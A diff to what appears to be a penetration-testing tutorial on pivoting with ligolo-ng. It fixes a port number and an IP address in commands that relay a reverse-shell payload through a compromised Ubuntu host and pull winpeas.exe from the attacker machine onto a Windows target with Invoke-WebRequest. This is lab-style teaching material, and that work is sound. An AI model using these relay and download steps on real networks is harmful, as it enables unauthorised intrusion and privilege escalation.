@@ -87,7 +87,7 @@ we can set this up using
 *   In attacker proxy terminal \
     `listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp`
 
-    on the pivot machine, any device or interface on port `3000` will redirect our port `10000`
+    on the pivot machine, any device or interface on port `30000` will redirect our port `10000`
 
 Which means we can create a payload with \
 lhost: 172.16.1.15\
@@ -115,7 +115,7 @@ In our attacker machine run python http server on port 22222
 
 In windows target machine, download the file using
 
-`Invoke-WebRequest -Uri "http://172.16.1.5:11111/winpeas.exe" -OutFile winpeas.exe`
+`Invoke-WebRequest -Uri "http://172.16.1.15:11111/winpeas.exe" -OutFile winpeas.exe`
 
 Here, windows will send request to port 11111 on pivot (ubuntu) and ligolo-ng will redirect it to port 22222 on our attacker machine\
 \
